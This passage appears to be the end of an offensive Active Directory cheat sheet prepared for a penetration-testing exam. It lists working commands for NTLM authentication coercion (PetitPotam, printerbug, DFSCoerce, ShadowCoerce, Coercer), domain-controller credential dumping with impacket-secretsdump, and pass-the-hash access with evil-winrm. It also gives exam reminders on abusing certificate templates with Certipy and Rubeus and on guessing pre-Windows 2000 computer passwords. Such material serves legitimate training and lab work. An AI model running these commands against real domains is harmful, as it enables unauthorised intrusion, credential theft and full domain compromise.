python3 PetitPotam.py -d dom -u U -p P LISTENER TARGET
python3 PetitPotam.py LISTENER TARGET                                 # unauth
python3 printerbug.py dom/U:P@TARGET LISTENER
python3 dfscoerce.py -u U -p P -d dom LISTENER TARGET
python3 shadowcoerce.py -u U -p P -d dom LISTENER TARGET
coercer coerce -l LISTENER -t TARGET -u U -p P -d dom --always-continue

# Post-ex with NT hash / TGT
impacket-secretsdump -hashes :NT 'dom/admin@DC' -just-dc
impacket-secretsdump -k -no-pass 'dom/DC$@DC' -just-dc
evil-winrm -i DC -u admin -H NTHASH
```

---

# PART 25 — CRITICAL EXAM REMINDERS

1. **Always sync time first** — `sudo ntpdate -u <DC>` before any certipy auth. Many "trust" errors are actually clock skew misreported.
2. **ESC4 cleanup** — `template -save-configuration` BEFORE modifying; `-write-configuration` AFTER exploit.
3. **ESC9/16 UPN restore** — revert VICTIM's UPN BEFORE auth; collisions break Kerberos.
4. **`-domain` flag on `certipy auth`** — REQUIRED when cert SAN UPN has no `@domain` (ESC9/16 spoof).
5. **`-sid` flag on `certipy req`** — REQUIRED in patched environments (post-KB5014754 Full Enforcement).
6. **PKINIT fail → `-ldap-shell`** — when KDC has no PKINIT cert, switch to Schannel.
7. **PEM→PFX for Rubeus** — must use `-keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0"`.
8. **`certipy ≥ 5.0.0`** required for ESC15/ESC16 detection (Fluffy, TombWatcher).
9. **Schema v1 templates** (WebServer, User, etc.) are ESC15-vulnerable until Nov 2024 patch.
10. **Pre-Win2K computers** have password = lowercase samaccountname (no `$`). MAQ default = 10 enables impacket-addcomputer.
